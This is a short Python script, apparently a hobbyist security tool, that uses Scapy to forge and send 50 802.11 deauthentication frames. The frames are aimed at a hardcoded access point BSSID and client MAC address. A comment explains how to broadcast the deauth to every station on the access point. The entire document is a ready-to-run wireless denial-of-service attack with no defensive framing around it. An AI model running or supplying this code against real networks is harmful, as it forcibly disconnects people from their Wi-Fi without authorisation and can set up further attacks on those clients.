#!/usr/bin/env python
# Scapy based wifi Deauth by @catalyst256
# Change the client to FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point

import sys
from scapy.all import *

# Commented out for now, using static values for the first version
#if len(sys.argv) != 5:
#    print 'Usage is ./scapy-deauth.py interfacet bssid client count'
#    print 'Example - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50'
#   sys.exit(1)

#from scapy.all import *

#conf.iface = sys.argv[1] # The interface that you want to send packets out of, needs to be set to monitor mode
#bssid = sys.argv[2] # The BSSID of the Wireless Access Point you want to target
#client = sys.argv[3] # The MAC address of the Client you want to kick off the Access Point
#count = sys.argv[4] # The number of deauth packets you want to send

conf.iface = "wlan0mon"
ssid = "6C:FD:B9:4B:D6:EC"
client = "E4:A7:A0:CD:D4:FD"
count = 50

conf.verb = 0

packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=ssid,addr3=ssid)/Dot11Deauth(reason=7)

for n in range(int(count)):
    sendp(packet)
    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
